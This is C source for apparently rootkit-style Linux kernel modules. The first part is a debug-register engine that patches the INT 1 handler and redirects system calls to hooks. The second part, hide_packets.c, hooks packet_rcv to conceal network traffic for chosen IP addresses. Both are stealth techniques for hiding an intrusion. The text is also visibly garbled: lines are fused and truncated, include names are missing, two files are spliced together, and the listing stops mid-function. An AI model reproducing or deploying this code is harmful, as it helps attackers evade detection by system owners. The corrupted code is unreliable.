    if (status & DR_TRAP1)
    {
        trap = 1;
        status &= ~DR_TRAP1;
    }
    /* check for trap on dr2 */
    if (status & DR_TRAP2)
    {
        trap = 2;
        status &= ~DR_TRAP2;
    }
    /* check for trap on dr3 */
    if (status & DR_TRAP3)
    {
        trap = 3;
        status &= ~DR_TRAP3;
    }
    /* we keep re-setting our control register after operation */
    /* DR0 is our int0x80 handler watch */
    control |= TRAP_GLOBAL_DR0;
    control |= DR_RW_EXECUTE eax])
            {
                __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                        "movl %1,%%dr7  \n\t"
                                        :
                                        : "r" (status), "r" (control)   );
                break;
            }
            /* DR2 2nd watch on the syscall_table entry for this syscall */
            dr2 = sys_table_global + (unsigned int)regs->eax * sizeof(void *);
            /* enable exact breakpoint detection LE/GE */
            s_control   |= TRAP_GLOBAL_DR2;
            s_control   |= TRAP_LE;
            s_control   |= TRAP_GE;
            s_control   |= DR_RW_READ eax, dr2));
            /* set dr2 read watch on syscall_table */
            __asm__ __volatile__ (  "movl %0,%%dr2  \n\t"
                                    :
                                    : "r" (dr2) );
            /* set new control .. gives up syscall handler to avoid races */
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (s_control)   );
            /* if vm86 mode .. pass it on to orig */
            if (regs->eflags & VM_MASK)
                goto orig_do_debug;
            break;
        /* handle the watch on syscall_table .. return patched address */ 
        case 2:
            DEBUGLOG(("*** got dr2 trap (syscall_table watch)\n"));
            /* clear dr2 watch */
            __asm__ __volatile__ (  "xorl %eax,%eax \n\t"   
                                    "movl %eax,%dr2 \n\t"   );
            /* restore old int0x80 handler control */
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (control)   );
            /*
                At the time of the trap1 eip is pointing at syscall
                so .. we just set the eip for the task to hook :P
                NOTE:
                eax has our syscall number for both sysenter/int0x80
            */
            if ((regs->eax >= 0 && regs->eax eax])
            {
                /* double check .. verify eip matches original */
                unsigned int verify_hook = (unsigned int)sys_p[regs->eax];
                if (regs->eip == verify_hook)
                {
                    regs->eip = (unsigned int)hook_table[regs->eax];
                    DEBUGLOG(("*** hooked __NR_%d at %X to %X\n", regs->eax, 
verify_hook, \
                                (unsigned int)hook_table[regs->eax]));
                }
            }
            if (regs->eflags & VM_MASK)
                goto orig_do_debug;
            break;
        case 3:
            DEBUGLOG(("*** got dr3 trap\n"));
            __asm__ __volatile__ (  "movl %0,%%dr6  \n\t"
                                    "movl %1,%%dr7  \n\t"
                                    :
                                    : "r" (status), "r" (control)   );
            break;
        default:
            DEBUGLOG(("*** unhandled trap"));
        orig_do_debug:
            /* call through to original int 1 handler */
            (*__orig_do_debug)(regs, error_code);
            /* restore our control just in case */
            __asm__ __volatile__ (  "movl %0,%%dr7  \n\t"
                                    :
                                    : "r" (control) );
    }
    /* set the resume flag after trap .. clear trap flag */
    if (trap >= 0)
    {
        regs->eflags |= X86_EFLAGS_RF;
        regs->eflags &= ~X86_EFLAGS_TF;
    }
}
unsigned int h0x01_global    = 0;
static void __exit exit_DR(void)
{
    struct watch watches = { 0, 0, 0, 0, 0, 0 };
    DEBUGLOG(("******* UNLOADING IA32 DR HOOKING ENGINE *******\n"));
    /* clear any breakpoints on all cpu's */
    on_each_cpu((void (*)())__set_watch, &watches, 0, 0);
    __get_and_set_do_debug_2_6(h0x01_global, (unsigned int)__orig_do_debug); 
    __uninit_hook_table();
    return;
}
/*
    This should:
    1) kalloc a page for the handler/hooks
    2) install the handler/hooks
    3) return without loading
    NOTE:
    Right now it just uses a module load logic for development
    debugging simplification.
*/
static int __init init_DR(void)
{
    unsigned int h0x80          = 0;
    unsigned int h0x01          = 0;
    unsigned int table          = 0;
    unsigned int syscall_call   = 0;
    unsigned int sysenter_entry = 0;
    struct watch watches        = { 0, 0, 0, 0, 0, 0 };
    DEBUGLOG(("******* LOADING IA32 DR HOOKING ENGINE *******\n"));
    h0x80 = __get_int_handler(0x80);
    DEBUGLOG(("*** loader: handler for INT 128: %X\n", h0x80));
    table               = __get_syscall_table(h0x80, RETURN_SYSCALL_TABLE);
    syscall_call        = __get_syscall_table(h0x80, RETURN_SYSCALL_CALL);
    sys_table_global    = table;
    DEBUGLOG(("*** loader: syscall_table: %X\n", table));
    DEBUGLOG(("*** loader: syscall_call call *table(,eax,4): %X\n", syscall_call));
    h0x01 = __get_int_handler(0x1);
    DEBUGLOG(("*** loader: handler for INT 1: %X\n", h0x01));
    /* XXX: only for debug cleanup on unload */
    h0x01_global    = h0x01;
    /* patch the do_debug call offset in the INT 1 handler */
    __orig_do_debug = (void (*)())__get_and_set_do_debug_2_6(h0x01, \
                                (unsigned int)__my_do_debug);
    DEBUGLOG(("*** loader: INT 1 handler patched to use __my_do_debug\n"));
     __init_hook_table();
    DEBUGLOG(("*** loader: initialized hook_table\n"));
    /*
        Set a breakpoint on sycall handler in dr0 for 1 byte
    */
    /* for DR_RW_EXECUTE len has to be 0 (1 byte) (IA32_SDM_3B.pdf) */
    /* syscall_call watch into dr0 */
    watches.ctrl    |= TRAP_GLOBAL_DR0;
    watches.ctrl    |= DR_RW_EXECUTE list);
#endif
    /* when we switch to kmalloc .. return -EINVAL */
    return 0; //-EINVAL;
}
/*
    main module init/exit
*/
module_init(init_DR);
module_exit(exit_DR);
/* taint-safe */
MODULE_LICENSE("GPL");
/**
 * hide_packets.c
 *
 * Hide ipv4 and ipv6 packets by hooking packet_rcv and omitting packets for specified 
ip addresses.
 */
#include "hook.h"
#include "function_hooking.h"
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
/* Length of ipv4 and ipv6 in bytes */
#define IPV4_LENGTH   4
#define IPV6_LENGTH     16
#define DENY_PACKET   1
#define ACCEPT_PACKET 0
/* counter for access counting */
static int accesses_packet_rcv = 0;
static int accesses_tpacket_rcv = 0;
static int accesses_packet_rcv_spkt = 0;
/* mutexes for safe accesses */
struct mutex lock_packet_rcv;
struct mutex lock_tpacket_rcv;
struct mutex lock_packet_rcv_spkt;
/* Variables to store old functions in */
int (*old_packet_rcv)(struct sk_buff *, struct net_device *,
    struct packet_type *, struct net_device *);
int (*old_tpacket_rcv)(struct sk_buff *, struct net_device *,
    struct packet_type *, struct net_device *);
int (*old_packet_rcv_spkt)(struct sk_buff *, struct net_device *,
    struct packet_type *, struct net_device *);
/* new packet receive */
int new_packet_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
    struct net_device *);
int new_tpacket_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
    struct net_device *);
int new_packet_rcv_spkt(struct sk_buff *, struct net_device *,
    struct packet_type *, struct net_device *);
function_hook_t *hook_packet_rcv;
function_hook_t *hook_tpacket_rcv;
function_hook_t *hook_packet_rcv_spkt;
struct ipv4_entry {
  u8 ipv4_addr[4];
  struct list_head list;
};
struct ipv6_entry {
  u8 ipv6_addr[16];
  struct list_head list;
};
LIST_HEAD( ipv4_list);
LIST_HEAD( ipv6_list);
/*
 * Check if the ip address is in the IPv4 list
 */
int is_in_list_ipv4(u8 *ip_addr) {
  struct ipv4_entry *existing_entry_v4, *tmp_v4;
  list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)
  {
    // TODO check if this cast works
    if ((uint32_t) * (existing_entry_v4->ipv4_addr)
        == (uint32_t) * (ip_addr)) {
      // if entry is in list, do nothing
      return 1;
    }
  }
  return 0;
}
/*
 * Check if the Ip address is in the IPv6 list
 */
int is_in_list_ipv6(u8 *ip_addr) {
  struct ipv6_entry *existing_entry_v6, *tmp_v6;
  list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
  {
    // TODO add casts
    if (existing_entry_v6->ipv6_addr == ip_addr) {
      /* if entry is in list, do nothing */
      return 1;
    }
  }
  return 0;
}
static int packet_check(struct sk_buff *skb) {
  /* Check if it is a IPv4 Packet */
  if (skb->protocol == htons(ETH_P_IP)) {
    /* get ipv4 header */
    struct iphdr *header = ip_hdr(skb);
    /* Check both source and destination */
    if (is_in_list_ipv4((u8 *) &header->saddr)
        || is_in_list_ipv4((u8 *) &header->daddr)) {
      /* ip in list, should be hidden */
      return DENY_PACKET;
    }
  }
  /* Check if it is a IPv6 Packet */
  if (skb->protocol == htons(ETH_P_IPV6)) {
    /* get ipv6 header */
    struct ipv6hdr *header = ipv6_hdr(skb);
    /* look for source and destination address */
    if (is_in_list_ipv6(header->saddr.s6_addr)
        || is_in_list_ipv6(header->daddr.s6_addr)) {
      /* ip in list, should be hidden */
      return DENY_PACKET;
    }
  }
  /* no ipv4 or ipv6 packet or not in list -> Packet can be accepted */
  return ACCEPT_PACKET;
}
/*
 * Add a new package to the list to be hidden.
 * supported protocols: "ipv4" and "ipv6"
 */
void packet_hide(char *protocol, char *ip) {
  u8 ipv4_addr[4];
  u8 ipv6_addr[16];
  struct ipv4_entry *existing_entry_v4, *tmp_v4;
  struct ipv6_entry *existing_entry_v6, *tmp_v6;
  struct ipv4_entry *new_entry_v4;
  struct ipv6_entry *new_entry_v6;
  /* Convert IPv4 from text to binary format */
  if (in4_pton(ip, -1, ipv4_addr, -1, NULL)
      && !strncmp(protocol, "ipv4", 4)) {
    /* no errors, check for occurrence in list */
    list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)